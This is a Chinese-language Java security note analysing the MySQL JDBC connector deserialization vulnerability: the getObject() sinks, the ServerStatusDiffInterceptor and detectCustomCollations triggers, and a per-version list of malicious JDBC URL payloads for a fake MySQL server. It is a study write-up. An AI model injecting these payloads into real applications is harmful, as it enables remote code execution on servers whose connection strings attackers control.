---
created: '22/03/03'
title: JDBC
tags:
  - java
  - java安全
---
# JDBC

## 什么是JDBC
> JDBC一般指Java数据库连接。Java数据库连接，（Java Data Base Connectivity，简称JDBC）
> 是一种用于执行SQL语句的Java API，可以为多种关系数据库提供统一访问，它由一组用Java语言编写的类和接口组成。JDBC提供了一种基准，据此可以构建更高级的工具和接口，使数据库开发人员能够编写数据库应用程序。

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220303103911.png)
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220303103920.png)

一个简单的示例如下:
```java
import java.sql.*;

public class Test {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        String Driver = "com.mysql.cj.jdbc.Driver";
        String DB_URL = "jdbc:mysql://127.0.0.1:3306/test?serverTimezone=UTC";
        Class.forName(Driver);
        // 连接数据库
        Connection conn = DriverManager.getConnection(DB_URL, "root", "root");
        // 操作数据库
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery("SELECT * FROM users");
        while (rs.next()) {
            System.out.println(rs.getString("username") + " : " + rs.getString("password"));
        }
    }
}
```


## JDBC反序列化漏洞简介
如果攻击者能够控制JDBC连接设置项(即上面示例中的`DB_URL`)，那么就可以通过设置其指向恶意MySQL服务器进行ObjectInputStream.readObject()的反序列化攻击从而RCE。

具体点说，就是通过JDBC连接MySQL服务端时，会有几个内置的SQL查询语句要执行，其中两个查询的结果集在MySQL客户端被处理时会调用ObjectInputStream.readObject()进行反序列化操作。

可被利用的两条查询语句：
-   SHOW SESSION STATUS
-   SHOW COLLATION

## JDBC反序列化漏洞分析
反序列化点(`readObject()`)在`com.mysql.cj.jdbc.result.ResultSetImpl`的`public Object getObject(int columnIndex)`的`switch`条件语句中，存在两处反序列化点，一处是`case BIT`，另一处是`case BLOB`:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220303111234.png)

![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220303111318.png)

那么我们就需要了解一下`getObject()`方法的作用，参考[jdbc的文档]([https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-type-conversions.html](https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-reference-type-conversions.html))
> `ResultSet.getObject()`方法是用于MySQL和Java类型之间的类型转换

而其中`BIT`和`BLOB`就是MySQL里的一种数据格式，也就是说如果我们数据中返回了`BIT`或者`BLOB`类型的数据，jdbc会尝试将其反序列化为java对象，这里就可能存在反序列化漏洞。

我们再来了解一下`BIT`和`BLOB`这两种MYSQL的数据格式:
`BLOB`：
> `BLOB`为二进制形式的长文本数据，大小是0-65535 bytes

`BIT`：
> Bit数据类型用来存储bit值 BIT(M)代表可以存储M个bit，M的取值范围为1到64 如果手工指定bit值，则可以使用b'value'格式，比如b'111'和 b'10000000'分别代表7和128

根据上面的介绍，我们将重点放在了BLOB这个数据格式，再分析一下代码逻辑，先获取结果集中的一列，判断其的mysql数据类型:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220303112147.png)

接下来是判断几个条件: 
1. filed是binary或者blob
2. 配置中的autoDeserialize为`true`
3. `data`满足第一位为`-84`第二位为`-19`，实际上为java序列化对象魔术头: `AC(0xAC == 256 - 84) ED(0xED == 256 - 19)`
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220303112313.png)

### ServerStatusDiffInterceptor触发方式
通过上面的了解，我们知道只要调用到`ResultSetImpl.getObject()`方法，就有机会造成反序列化。我们来看看这个类触发方式的payload(8.x，不同jdbc版本的payload不一样):
```
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
```

这里传入了2个参数，一个是我们上文提到的`autoDeserialize`，将其设置为`true`才有机会进入反序列化，第二个参数则是`queryInterceptors`，这是一个新的参数，通过查询jdbc的文档知道它一个逗号分割的Class列表（实现了com.mysql.cj.interceptors.QueryInterceptor接口的类），在Query”之间”进行执行来影响结果。（效果上来看是在Query执行前后各插入一次操作）；

我们这里用到的`ServerStatusDiffInterceptor`就是一个实现了`com.mysql.cj.interceptors.QueryInterceptor`的类，其具体触发方式如下，先触发了`ServerStatusDiffInterceptor.preProcess()`方法:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220303113816.png)

继续跟进，会调用`ServerStatusDiffInterceptor.populateMapWithSessionStatusValues()`方法，其会执行`SHOW SESSION STATUS`，然后将结果传入`ResultSetUtil.resultSetToMap()`方法:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220303113939.png)

这里最终调用到了`ResultSetImpl.getObject()`方法:
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220303115853.png)

### detectCustomCollations触发方式
这里的`detectCustomCollations`是jdbc链接时的一个选项，这个选项是从5.1.29开始的，经过代码比对，可以认为`detectCustomCollations`这个选项在5.1.29之前一直为true。我们来看看这个类触发方式的payload:
```
jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true
```

触发点在`com.mysql.jdbc.ConnectionImpl`的`buildCollationMapping`方法中，这里可以看到需要满足2个条件：
1. 服务器版本大于等于4.1.0
2. `detectCustomCollations`选项为`true`
![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220303120652.png)

后续的分析和上面是一样的，其会执行`SHOW COLLATION`语句并将将结果传入`ResultSetUtil.resultSetToMap()`方法，最后调用到`ResultSetImpl.getObject()`方法。

## 利用方式
实际上利用方式就是构造一个Mysql的虚假服务器，在执行对应语句时返回BLOB类型的数据(恶意的java序列化对象)，一般我们会使用现有的项目: [MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)

## 各个版本payload总结
这里参考[这篇文章](https://blog.csdn.net/fnmsd/article/details/106232092):

**ServerStatusDiffInterceptor触发：**
**8.x:**`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
**6.x(属性名不同):**`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
**5.1.11及以上的5.x版本（包名没有了cj）:**`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_JRE8u20_calc`
**5.1.10及以下的5.1.X版本：** 同上，但是需要连接后执行查询。
**5.0.x:** 还没有`ServerStatusDiffInterceptor`这个东西┓( ´∀` )┏

**detectCustomCollations触发：**
**6.0.7及以上:** 不可用
**6.0.2-6.0.6:** `jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc`
**5.1.40-5.1.48:** 需要对[fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)项目稍作调整，将第三个字段也填充为序列化数据即可。![](https://tuchuang-1300339532.cos.ap-chengdu.myqcloud.com/img/20220304094851.png)
`jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc`
**5.1.29-5.1.39:**`jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=yso_JRE8u20_calc`
**5.1.19-5.1.28：**`jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&user=yso_JRE8u20_calc`
**5.1.0-5.1.18：** 不可用
**5.0.x:** 不可用


## 参考文章
1. https://www.anquanke.com/post/id/203086
2. https://blog.csdn.net/fnmsd/article/details/106232092
3. https://c014.cn/blog/java/JDBC/MySQL%20JDBC%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html
4. https://github.com/fnmsd/MySQL_Fake_Server
5. https://xz.aliyun.com/t/10923
